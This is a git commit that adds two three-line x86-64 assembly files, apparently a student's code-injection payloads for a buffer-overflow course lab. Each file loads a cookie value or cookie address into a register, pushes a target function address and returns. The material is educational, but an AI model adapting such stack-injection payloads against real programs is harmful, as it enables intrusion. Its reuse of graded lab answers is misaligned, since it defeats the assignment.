9657e86210a2cf6c117c5e8fa2b56c181800273e
MARVELOUSbear <1138982826@qq.com>
2017-06-10 10:48:25 +0800

    update

---
+++ bufferlab/p2.s
@@ -0,0 +1,3 @@
+mov $0x3e8a5639,%rdi # set my cookie as the first parameter
+pushq $0x4018c9
+ret
---
+++ bufferlab/p3.s
@@ -0,0 +1,3 @@
+mov $0x5567b0a8,%rdi # mov the cookie string address to parameter
+push $0x4019da #push touch3 address
+ret
